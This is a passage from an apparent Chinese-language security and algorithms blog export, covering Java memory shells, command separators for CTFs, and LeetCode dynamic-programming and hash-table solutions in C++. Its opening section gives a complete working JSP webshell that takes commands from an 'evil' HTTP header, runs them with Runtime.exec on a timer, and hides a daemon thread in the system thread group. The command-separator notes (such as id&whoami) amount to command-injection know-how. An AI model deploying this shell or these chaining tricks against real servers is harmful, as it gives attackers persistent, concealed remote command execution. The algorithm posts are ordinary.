<p>在jsp中定义方法的时候,要使用<code>&lt;%! %&gt;</code>,它能将包裹的内容直接放到映射的servlet中去</p>
<h4 id="不死线程内存马"><a href="#不死线程内存马" class="headerlink" title="不死线程内存马"></a>不死线程内存马</h4><p>Timer型内存马可以归类为不死线程内存马,它的本质就是创建了一个定时执行的Timer线程</p>
<p>所以还可以通过将这个定时接收命令的代码设置为一个不会被GC的守护线程,所有用户线程结束,守护线程才会结束</p>
<p>同时将恶意线程放进<code>system</code>线程组中隐藏</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String cmd=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">            Thread[] threads = (Thread[]) getField(threadGroup, <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(Thread thread: threads)&#123;</span><br><span class="line">                <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    String threadName=thread.getName();</span><br><span class="line">                    <span class="keyword">if</span>(threadName.contains(<span class="string">&quot;Poller&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                        ArrayList processors;</span><br><span class="line">                        Object target = getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span>(target <span class="keyword">instanceof</span> Runnable)&#123;</span><br><span class="line">                            <span class="keyword">try</span>&#123;</span><br><span class="line">                                processors=(ArrayList)getField(getField(getField(getField(target,<span class="string">&quot;this$0&quot;</span>),<span class="string">&quot;handler&quot;</span>),<span class="string">&quot;global&quot;</span>),<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span>(Object processor:processors)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(processor!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                                    Object req = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                    String temp=(String) req.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>,String.class).invoke(req,<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span>(temp!=<span class="keyword">null</span>&amp;&amp;!temp.isEmpty())&#123;</span><br><span class="line">                                        cmd=temp;</span><br><span class="line">                                        <span class="keyword">return</span> cmd;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; objectClass = object.getClass();</span><br><span class="line">        Field field=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (objectClass!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field=objectClass.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                objectClass=objectClass.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(field==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*获取system线程组*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ThreadGroup <span class="title">getSystemThreadGroup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ThreadGroup group=Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">while</span>(!group.getName().equals(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">            group=group.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> group;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    java.util.Timer ececute=<span class="keyword">new</span> java.util.Timer();</span><br><span class="line">    ececute.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            String cmd=getHeader();</span><br><span class="line">            <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建线程,加入到system线程组中</span></span><br><span class="line">    Thread thread=<span class="keyword">new</span> Thread(getSystemThreadGroup(), <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                String cmd=getHeader();</span><br><span class="line">                <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;no GC me&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    thread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    thread.start();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考连接</p>
<p><a href="https://www.cnblogs.com/nongchaoer/p/15561948.html">https://www.cnblogs.com/nongchaoer/p/15561948.html</a></p>
<p><a href="https://github.com/4ra1n/JavaSecInterview/tree/master/memshell">https://github.com/4ra1n/JavaSecInterview/tree/master/memshell</a></p>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>memshell</tag>
      </tags>
  </entry>
  <entry>
    <title>命令连接符总结</title>
    <url>/2022/01/21/%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="命令连接符总结"><a href="#命令连接符总结" class="headerlink" title="命令连接符总结"></a>命令连接符总结</h1><h3 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h3><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
<p>|前面的语句为真,则执行|后面的语句</p>
<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
<h3 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h3><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
<p>id&amp;whoami前后命令都会执行</p>
<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>命令连接符</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>动态规划</title>
    <url>/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h3 id="动态规划题目的分类"><a href="#动态规划题目的分类" class="headerlink" title="动态规划题目的分类"></a>动态规划题目的分类</h3><ol>
<li>背包问题</li>
<li>打家劫舍</li>
<li>股票问题</li>
<li>子序列问题</li>
</ol>
<h3 id="做动态规划类题目需要注意的问题-五部曲"><a href="#做动态规划类题目需要注意的问题-五部曲" class="headerlink" title="做动态规划类题目需要注意的问题(五部曲)"></a>做动态规划类题目需要注意的问题(五部曲)</h3><ol>
<li>dp数组以及下标的含义</li>
<li>递推公式</li>
<li>dp数组如何初始化</li>
<li>遍历顺序</li>
<li>打印dp数组</li>
</ol>
<h4 id="509-斐波那契数"><a href="#509-斐波那契数" class="headerlink" title="509. 斐波那契数"></a><a href="https://leetcode.cn/problems/fibonacci-number/">509. 斐波那契数</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011109655.png" alt="image-20241001110937586"></p>
<h5 id="五部曲"><a href="#五部曲" class="headerlink" title="五部曲"></a>五部曲</h5><ol>
<li>dp[i]表示第i个斐波那契数为dp[i]</li>
<li>递推公式 dp[i]=dp[i-1]+dp[i-2]</li>
<li>初始化dp[1]=0,dp[2]=1</li>
<li>遍历顺序 从前往后</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&gt;<span class="number">0</span>)</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">70. 爬楼梯</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011109508.png" alt="image-20241001110948452"></p>
<h5 id="五部曲-1"><a href="#五部曲-1" class="headerlink" title="五部曲"></a>五部曲</h5><ol>
<li>dp[i]表示i阶楼梯有几种爬法</li>
<li>递推公式 因为一次只能爬1或者2阶,那么第i阶只能从第i-1或者第i-2阶上来,两种相加dp[i]=dp[i-1]+dp[i-2]</li>
<li>初始化 dp[1]=1 dp[2]=2</li>
<li>遍历顺序 从前往后</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dp[i]表示爬到第i阶楼梯有dp[i]种爬法</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &gt; <span class="number">1</span>)</span><br><span class="line">            dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="746-使用最小花费爬楼梯"><a href="#746-使用最小花费爬楼梯" class="headerlink" title="746. 使用最小花费爬楼梯"></a><a href="https://leetcode.cn/problems/min-cost-climbing-stairs/">746. 使用最小花费爬楼梯</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011110692.png" alt="image-20241001111010618"></p>
<h5 id="五部曲-2"><a href="#五部曲-2" class="headerlink" title="五部曲"></a>五部曲</h5><ol>
<li>dp[i]表示爬到第i阶(i从0开始)的最小花费</li>
<li>递推公式dp[i] = min(dp[i - 2] + cost[i - 2], dp[i - 1] + cost[i - 1]);</li>
<li>初始化 dp[0]=0,dp[1]=1   本题的楼顶其实是第n阶,所以dp大小为n+1</li>
<li>遍历顺序 从前往后</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//从下标为2的台阶开始,到达他只有它的前一阶或者前两阶两条路,二者选花费最小的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i - <span class="number">2</span>] + cost[i - <span class="number">2</span>], dp[i - <span class="number">1</span>] + cost[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62. 不同路径"></a><a href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011110299.png" alt="image-20241001111027235"></p>
<h5 id="五部曲-3"><a href="#五部曲-3" class="headerlink" title="五部曲"></a>五部曲</h5><ol>
<li>dp数组表示到达<code>dp[i][j]</code>有几种路径</li>
<li>递推公式<code> dp[i][j] = dp[i][j - 1] + dp[i - 1][j];</code> </li>
<li>初始化,第一行和第一列全都为1,其他的地方要基于他们来走</li>
<li>遍历顺序  逐行逐列</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m, vector&lt;<span class="keyword">int</span>&gt;(n));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 每一个只能从左边或者右边走来</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>] + dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="63-不同路径-II"><a href="#63-不同路径-II" class="headerlink" title="63. 不同路径 II"></a><a href="https://leetcode.cn/problems/unique-paths-ii/">63. 不同路径 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011110381.png" alt="image-20241001111043311"></p>
<ol>
<li>dp数组表示到达<code>dp[i][j]</code>有几种路径,其中如果(i,j)位置有障碍,则将其置为0表示不可达</li>
<li>递推公式<code> dp[i][j] = dp[i][j - 1] + dp[i - 1][j];</code> </li>
<li>初始化和上题不一样的就是需要将有障碍的地方以及其后续dp数组置为0</li>
<li>遍历顺序同上</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; obstacleGrid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = obstacleGrid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m, vector&lt;<span class="keyword">int</span>&gt;(n));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[<span class="number">0</span>][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; n) &#123;</span><br><span class="line">                    dp[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (obstacleGrid[i][<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (i &lt; m) &#123;</span><br><span class="line">                    dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 每一个只能从左边或者右边走来</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>] + dp[i - <span class="number">1</span>][j];</span><br><span class="line">                <span class="keyword">if</span> (obstacleGrid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="343-整数拆分"><a href="#343-整数拆分" class="headerlink" title="343. 整数拆分"></a><a href="https://leetcode.cn/problems/integer-break/">343. 整数拆分</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011110516.png" alt="image-20241001111053464"></p>
<ol>
<li><p>dp数组表示从2到n的每个整数的拆分乘积最大值</p>
</li>
<li><p>递推公式   :  对于每个整数,从1开始拆分到<code>i/2</code>即可(因为超过<code>i/2</code>的部分和前面是对称的),对于每一次拆分,取如下两种情况的最大值</p>
<ol>
<li>不再对j继续进行拆分<code>j * (i - j)</code></li>
<li>继续将j往下拆分<code>j * dp[i - j]</code>     </li>
</ol>
<p>然后dp记录这些拆分情况的最大值</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i / <span class="number">2</span>; j++) &#123;</span><br><span class="line">                <span class="comment">// 记录每次拆分的最大值</span></span><br><span class="line">                <span class="keyword">int</span> curMax = <span class="built_in">max</span>(j * (i - j), j * dp[i - j]);</span><br><span class="line"></span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], curMax);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96. 不同的二叉搜索树"></a><a href="https://leetcode.cn/problems/unique-binary-search-trees/">96. 不同的二叉搜索树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011111762.png" alt="image-20241001111113707"></p>
<ol>
<li>dp数组表示i个结点可以构成i种二叉搜索树</li>
<li>递推公式<code> dp[i]+=dp[j]*dp[i-j-1];</code>  本题的难点在于拆分左右子树，二叉搜索树是可以有序遍历的，所以它的形状一旦确定，里面填写的数字也就被确定了，所以跟普通的二叉树形状一样，其中选一个当根节点，左右子树从0和i-1的个数开始搭配变化</li>
<li>初始化dp[0]=1,dp[1]=1</li>
<li>遍历顺序同上</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                dp[i] += dp[j] * dp[i - j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>哈希表</title>
    <url>/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><h4 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242. 有效的字母异位词"></a><a href="https://leetcode.cn/problems/valid-anagram/">242. 有效的字母异位词</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011125553.png" alt="image-20241001112507497"></p>
<p>思路：采用数组当做哈希表</p>
<p>其中可以巧妙利用字母减<code>a</code>将其变为从0开始的int类型的变量</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hash[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            hash[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; t.<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            hash[t[j] - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> 